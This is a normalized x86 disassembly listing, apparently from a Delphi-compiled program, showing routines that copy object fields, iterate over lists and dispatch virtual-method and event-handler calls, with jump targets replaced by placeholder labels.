call sub_480b24
test al al
je r-xdata
mov esi ebx
mov eax [ esi + 0xa4 ]
test eax eax
je r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov esi 0x2
mov esi ebx
mov edx [ esi + 0x84 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ esi + 0x8c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov eax esi
call sub_480d20
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x80 ]
mov edx esi
call sub_48056c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov edx esi
call sub_48056c
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x58
mov esi ebx
mov edx [ esi + 0x58 ]
call sub_4040e8
mov eax [ ebp - 0x4 ]
add eax 0x40
mov edx [ esi + 0x40 ]
call sub_4040e8
mov eax [ esi + 0x80 ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov eax [ eax + 0x8 ]
dec eax
call sub_47695c
sub eax 0x2
jl r-xdata
push ebp
mov eax [ esi + 0x48 ]
call sub_482724
pop ecx
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x4 ]
call sub_480444
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482a3e
lea eax [ ebp - 0xc ]
call sub_404094
retn
mov esi ebx
mov edx [ esi + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
mov eax [ ebp - 0x4 ]
add eax 0x78
mov edx [ esi + 0x78 ]
call sub_4040e8
mov eax [ ebp - 0x4 ]
add eax 0x7c
mov edx [ esi + 0x7c ]
call sub_4040e8
mov eax [ ebp - 0x4 ]
add eax 0x6c
mov edx [ esi + 0x6c ]
call sub_4040e8
mov al [ esi + 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] al
mov al [ esi + 0x90 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x90 ] al
mov al [ esi + 0xa0 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa0 ] al
mov al [ esi + 0xa1 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa1 ] al
mov ax [ esi + 0x44 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] ax
mov al [ esi + 0x70 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x70 ] al
mov al [ esi + 0xa8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa8 ] al
mov eax [ ebp - 0x4 ]
add eax 0xf0
mov edx [ esi + 0xf0 ]
call sub_4040e8
mov eax [ ebp - 0x4 ]
call sub_480ca0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi + 0x3c ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_481988
jmp r-xdata
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
mov eax [ ebx + 0x3c ]
mov edx esi
call sub_4143bc
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
call sub_414210
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x60 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_481d5c
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
sub_482a48
push ebx
push esi
push edi
mov ebx eax
lea eax [ ebx + 0x38 ]
mov ecx edx
mov edx ebx
xchg edx eax
call sub_481d50
cmp [ ebx + 0x38 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_481f8c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov ecx 0x20000000
mov edx edi
mov eax ebx
call sub_482b80
inc edi
dec esi
jne r-xdata
sub_482acc
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
mov edi [ ebx + 0x88 ]
cmp esi [ edi + 0x8 ]
jge r-xdata
mov eax ebp
call sub_404094
jmp r-xdata
mov edx esi
mov eax edi
call sub_4143bc
test eax eax
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x88 ]
call sub_4143bc
mov edx ebp
call sub_408ba4
sub_482b10
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
cmp esi [ edi + 0x8 ]
jge r-xdata
mov eax [ ebx + 0x34 ]
mov edx esi
mov eax edi
call sub_4143bc
cmp eax 0x20000000
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
jmp r-xdata
mov eax esi
call sub_4774ec
jmp r-xdata
sub_482b4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x68 ] esi
mov eax ebx
call sub_4810f0
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
mov edx ebx
call sub_484940
mov edx ebx
call sub_484a38
sub_482b94
push ebx
push esi
mov ebx edx
test ebx ebx
jne r-xdata
mov eax ebx
call sub_404354
inc eax
call sub_4026f4
mov esi eax
mov edx ebx
mov eax esi
call sub_408a50
xor esi esi
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_482bc0
push ebx
mov eax [ eax + 0x88 ]
call sub_4143bc
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
call sub_40898c
mov edx eax
inc edx
mov eax ebx
call sub_402714
sub_482be8
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x80 ]
mov ebx [ ebp + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ edi + 0x3c ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ edi + 0x3c ]
mov edx [ rw-data ]
call sub_414520
mov eax [ edi + 0x88 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ edi + 0x88 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ edi + 0x88 ]
mov edx [ rw-data ]
call sub_414520
mov eax [ edi + 0x64 ]
call sub_47f8d0
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_48056c
mov edx [ eax ]
call [ edx + 0x14 ]
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
call sub_482bc0
inc esi
dec ebx
jne r-xdata
sub_482c70
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
mov eax ebx
call sub_483268
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
pop ebx
retn
cmp [ ebx + 0x68 ] 0x0
je r-xdata
mov eax [ ebx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax ebx
call sub_481450
sub_482cbc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x13c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0x8e ] 0x0
je r-xdata
cmp [ esi + 0x8e ] 0x0
jne r-xdata
cmp [ ebx + 0x90 ] 0x2
je r-xdata
cmp [ ebx + 0xa0 ] 0x2
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
cmp esi [ ebx + 0x50 ]
je r-xdata
cmp esi [ ebx + 0x54 ]
je r-xdata
sub_482d08
push ebx
push esi
push edi
mov edi ecx
mov esi [ eax + 0x68 ]
mov ebx [ esi + 0x288 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x10 ]
call sub_41d9c0
cmp eax [ esi + 0x34c ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41d9c0
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x10 ]
call sub_41dae4
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
xor edx edx
mov eax [ ebx + 0xc ]
call sub_41d6c0
mov edx 0xffffff
mov eax [ ebx + 0xc ]
call sub_41d6c0
sub_482d74
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] ecx
mov esi edx
mov ebx eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x288 ]
mov edi [ eax + 0x10 ]
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xb8 ]
mov edx eax
mov eax edi
call sub_41d9c8
mov edx [ ebx + 0x34 ]
mov eax edi
call sub_41d9c8
jmp r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x34c ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x130 ]
cmp [ esp + 0x4 ] 0x20000000
jne r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0x10 ]
call sub_41d9c0
cmp eax 0x1fffffff
je r-xdata
mov edi [ ebx + 0x68 ]
mov eax [ esp + 0x4 ]
push eax
mov eax [ edi + 0x288 ]
mov eax [ eax + 0x10 ]
call sub_41d9c0
mov edx eax
mov cl [ esp + 0xc ]
mov eax edi
call sub_477924
mov ecx [ esp ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x12c ]
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x34c ]
mov [ esp + 0x4 ] eax
cmp [ esp + 0x4 ] 0x20000000
jne r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x70 ]
mov [ esp + 0x4 ] eax
sub_482e74
push ebx
mov ebx eax
cmp [ ebx + 0x9c ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_4834d4
mov edx eax
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x33c ]
call sub_476954
mov edx [ ebx + 0x68 ]
mov [ edx + 0x33c ] eax
mov eax [ ebx + 0x68 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xf4 ] eax
pop ebx
retn
inc [ eax + 0x33c ]
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x33c ]
mov [ ebx + 0xf4 ] eax
jmp r-xdata
pop ebx
retn
sub_482ed0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebx + 0x50 ]
call sub_47d180
pop esi
pop ebx
retn
sub_482f04
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x10 ]
mov edx [ ebx + 0x68 ]
mov [ edx + 0x28d ] 0x0
test al 0x40
je r-xdata
cmp [ ebx + 0xda ] 0x0
je r-xdata
cmp [ ebx + 0xe2 ] 0x0
je r-xdata
mov eax [ ebx + 0x68 ]
mov al [ eax + 0x28d ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov edx [ ebx + 0x68 ]
mov [ edx + 0x28d ] 0x1
mov dl [ ebp + 0x14 ]
push edx
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
mov edx [ ebx + 0x68 ]
mov [ edx + 0x28d ] 0x1
mov dl [ ebp + 0x14 ]
push edx
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
jmp r-xdata
sub_482f98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebx + 0x54 ]
call sub_47d1c4
pop esi
pop ebx
retn
sub_482fbc
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax [ edi + 0x80 ]
mov [ esp ] eax
mov eax [ esp ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ edi + 0x3c ]
cmp ebx [ eax + 0x8 ]
jge r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x88 ]
cmp ebx [ eax + 0x8 ]
jge r-xdata
mov edx ebx
call sub_41425c
mov edx ebp
mov eax [ esp ]
call sub_48056c
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
inc ebp
dec esi
jne r-xdata
mov eax [ edi + 0x64 ]
mov eax [ eax + 0x24 ]
cmp ebx [ eax + 0x8 ]
jge r-xdata
mov edx ebx
mov eax edi
call sub_482bc0
mov eax [ edi + 0x88 ]
mov edx ebx
call sub_41425c
mov ecx ebx
mov dl 0x2
mov eax edi
call sub_483268
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov edx ebx
call sub_41425c
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_481450
sub_483054
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp ecx
mov edi edx
mov [ esp ] eax
mov eax [ esp ]
mov eax [ eax + 0x80 ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp ]
mov eax [ eax + 0x3c ]
mov ecx ebp
mov edx edi
call sub_41434c
mov eax [ esp ]
mov eax [ eax + 0x88 ]
mov ecx ebp
mov edx edi
call sub_41434c
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ esp + 0x4 ]
call sub_48056c
mov eax [ eax + 0x8 ]
mov ecx ebp
mov edx edi
call sub_41434c
inc esi
dec ebx
jne r-xdata
sub_48314c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_4834d4
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_483170
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_4834d4
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_483194
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_483213
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_481f8c
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48321a
lea eax [ ebp - 0xc ]
call sub_404094
retn
inc esi
mov [ ebp - 0x8 ] 0x0
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_482144
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_476954
mov [ ebp - 0x4 ] eax
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
sub_483224
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x60 ]
call sub_414418
inc eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x60 ]
call sub_414210
sub_483268
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] dl
mov [ esp ] eax
mov eax [ esp ]
mov eax [ eax + 0x60 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
jmp [ edx * 4 + jump_table_4832b1 ]
mov eax [ esp ]
mov eax [ eax + 0x60 ]
mov edx esi
call sub_4143bc
xor edx edx
mov dl [ esp + 0x4 ]
cmp edx 0x4
ja r-xdata
test [ eax + 0xa1 ] 0x8
je r-xdata
test [ eax + 0xa1 ] 0x1
je r-xdata
test [ eax + 0xa1 ] 0x4
je r-xdata
test [ eax + 0xa1 ] 0x2
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x98 ]
jmp r-xdata
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp ]
mov edi [ eax ]
call [ edi + 0x40 ]
jmp r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp ]
mov edi [ eax ]
call [ edi + 0x34 ]
jmp r-xdata
sub_483348
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4833eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41a200
mov esi [ ebx + 0x74 ]
test esi esi
je r-xdata
mov eax ebx
call sub_480ca0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4833f2
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebx + 0x74 ]
call sub_403344
mov eax [ ebx + 0x48 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x74 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_41a2b8
mov edx eax
mov eax ebx
call sub_480d44
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
sub_4833fc
push ebx
push esi
push edi
push ebp
push ecx
call sub_4036d0
mov [ esp ] dl
mov ebp eax
lea eax [ ebp + 0xa4 ]
call sub_40d6a0
mov eax ebp
call sub_480d80
lea eax [ ebp + 0x48 ]
call sub_40d6a0
mov eax [ ebp + 0x60 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx + 0x98 ]
lea eax [ ebp + 0x60 ]
call sub_40d6a0
mov ebx [ ebp + 0x80 ]
mov esi [ ebx + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax [ ebp + 0x80 ]
call sub_403344
mov eax [ ebp + 0x3c ]
call sub_403344
mov eax [ ebp + 0x88 ]
call sub_403344
mov eax [ ebp + 0x64 ]
call sub_403344
cmp [ ebp + 0x68 ] 0x0
je r-xdata
inc esi
xor edi edi
mov eax [ ebp + 0x60 ]
mov edx edi
call sub_4143bc
mov edx ebp
call sub_483244
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebp
call sub_419dfc
cmp [ esp ] 0x0
jle r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx edi
mov eax ebx
call sub_48056c
call sub_403344
inc edi
dec esi
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4036b8
sub_483500
push ebx
push esi
push edi
push ebp
mov edi eax
xor ebp ebp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_4143bc
cmp [ eax + 0x30 ] 0x0
je r-xdata
sub_483530
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_478104
mov [ ebx + 0x302 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov [ ebx + 0x2e8 ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x300 ] 0x1
mov [ ebx + 0x301 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x348 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47b168
mov esi eax
mov [ ebx + 0x2f4 ] esi
mov [ esi + 0x8e ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47b168
mov esi eax
mov [ ebx + 0x2f0 ] esi
mov eax esi
mov [ eax + 0x8e ] 0x1
mov [ eax + 0x8f ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47b168
mov esi eax
mov [ ebx + 0x2f8 ] esi
mov eax [ esi + 0x30 ]
mov [ eax + 0xc ] 0x5a
mov [ esi + 0xd0 ] 0x5a
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47b168
mov esi eax
mov [ ebx + 0x2fc ] esi
mov eax esi
mov edx [ eax + 0x30 ]
mov [ edx + 0xc ] 0x10e
mov [ eax + 0xd0 ] 0x10e
mov [ eax + 0x8f ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47b168
mov esi eax
mov [ ebx + 0x2ec ] esi
mov eax esi
mov [ eax + 0x94 ] 0x0
mov [ eax + 0xe0 ] 0x1
mov [ eax + 0x8f ] 0x1
mov [ ebx + 0x330 ] 0x1
mov [ ebx + 0x338 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_48368c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov si 0xffb1
call sub_403540
cmp eax edi
jge r-xdata
cmp edi 0x1
jge r-xdata
mov edi eax
cmp edi [ ebx + 0x330 ]
je r-xdata
mov edi 0x1
pop edi
pop esi
pop ebx
retn
lea edx [ ebx + 0x330 ]
mov ecx edi
mov eax ebx
call sub_477aa8
cmp [ ebx + 0x31a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
sub_4836f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebp - 0xc ] 0x0
jle r-xdata
inc esi
xor edi edi
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x334 ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
test edx edx
jle r-xdata
inc edi
dec esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx edi
call sub_483fd0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_481f8c
mov [ ebp - 0xc ] eax
mov [ ebp - 0xd ] 0x0
mov eax ebx
call sub_481f8c
cmp eax [ ebp - 0xc ]
jle r-xdata
sub_4837a8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x334 ] 0x0
jle r-xdata
mov eax 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_483fd0
call sub_480b24
test al al
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2fc ]
call sub_4836f4
pop ecx
push eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f8 ]
call sub_4836f4
pop ecx
pop edx
call sub_476954
pop ecx
pop ebp
retn
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f4 ]
call sub_4836f4
pop ecx
push eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f0 ]
call sub_4836f4
pop ecx
pop edx
call sub_476954
jmp r-xdata
pop ecx
pop ebp
retn
sub_483838
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4838bb
push [ fs : eax ]
mov [ fs : eax ] esp
test edx edx
jge r-xdata
lea eax [ edi + 0x334 ]
mov ecx edx
mov edx edi
xchg edx eax
call sub_477aa8
mov eax edi
mov si 0xffb1
call sub_403540
cmp eax [ edi + 0x330 ]
jge r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4838c2
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x104 ]
sub_4838c8
push ebx
push esi
mov esi eax
jmp r-xdata
mov eax esi
call sub_484c5c
test eax eax
jg r-xdata
xor edx edx
mov eax esi
call sub_483fd0
mov ebx eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax ebx
call sub_403344
pop esi
pop ebx
retn
sub_4838f8
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_4838c8
mov eax [ esi + 0x2e8 ]
call sub_403344
mov edi [ esi + 0x348 ]
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jg r-xdata
mov eax edi
call sub_4143b4
call sub_403344
xor edx edx
mov eax edi
call sub_41425c
mov eax [ esi + 0x348 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_478198
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_483960
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x302 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ esi + 0x2e8 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov bl [ esi + 0x278 ]
jmp r-xdata
inc ebp
mov [ esp + 0x4 ] 0x0
inc [ esp + 0x4 ]
dec ebp
jne r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x13c ]
test al al
je r-xdata
mov edx [ esp + 0x4 ]
mov eax esi
call sub_483fd0
mov edi eax
cmp [ edi + 0x30 ] 0x0
je r-xdata
